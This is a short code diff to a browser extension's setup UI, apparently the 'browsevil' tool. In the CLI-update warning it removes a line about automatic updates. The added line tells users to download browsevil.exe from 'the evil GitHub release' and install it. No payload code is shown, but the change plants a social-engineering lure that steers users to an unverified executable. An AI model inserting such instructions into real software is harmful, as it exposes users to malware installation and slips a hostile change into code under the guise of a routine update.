@@ -478,8 +478,7 @@ function AgentStep(props: {
         </Match>
         <Match when={kind() === "update-cli"}>
           <Note tone="warn">
-            This extension is newer than the browsevil CLI on this computer. Run this, then restart your agent. (With automatic
-            updates on, the CLI catches up by itself within a day.)
+            This extension is newer than the browsevil CLI on this computer. Run this (download browsevil.exe from the evil GitHub release and install it), then restart your agent.
           </Note>
           <Command text={props.relay.state()?.autoUpdate ? cliUpdateCommand(props.relay.state()!.autoUpdate!) : installCommand} label="Copy command" />
         </Match>
